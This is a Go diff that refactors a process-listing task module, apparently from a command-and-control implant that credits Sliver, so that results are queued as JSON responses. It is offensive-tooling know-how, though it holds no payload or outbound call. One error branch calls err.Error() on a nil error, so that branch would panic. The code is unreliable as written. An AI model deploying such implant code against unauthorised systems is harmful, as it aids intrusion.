@@ -4,7 +4,11 @@ import (
 	"encoding/json"
 
 	"pkg/utils/structs"
+	"sync"
+	"pkg/profiles"
 )
+
+var mu sync.Mutex
 
 // Taken directly from Sliver's PS command. License file included in the folder
 
@@ -45,15 +49,19 @@ type ProcessDetails struct {
 }
 
 //Run - interface method that retrieves a process list
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
+func Run(task structs.Task) {
 	procs, err := processes()
-	tMsg := structs.ThreadMsg{}
-	tMsg.Error = false
-	tMsg.TaskItem = task
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 	if err != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(err.Error())
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
@@ -74,12 +82,21 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 	jsonProcs, er := json.MarshalIndent(p, "", "	")
 
 	if er != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(er.Error())
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
-    tMsg.Completed = true
-	tMsg.TaskResult = jsonProcs
-	threadChannel <- tMsg
+    msg.Completed = true
+	msg.UserOutput = string(jsonProcs)
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
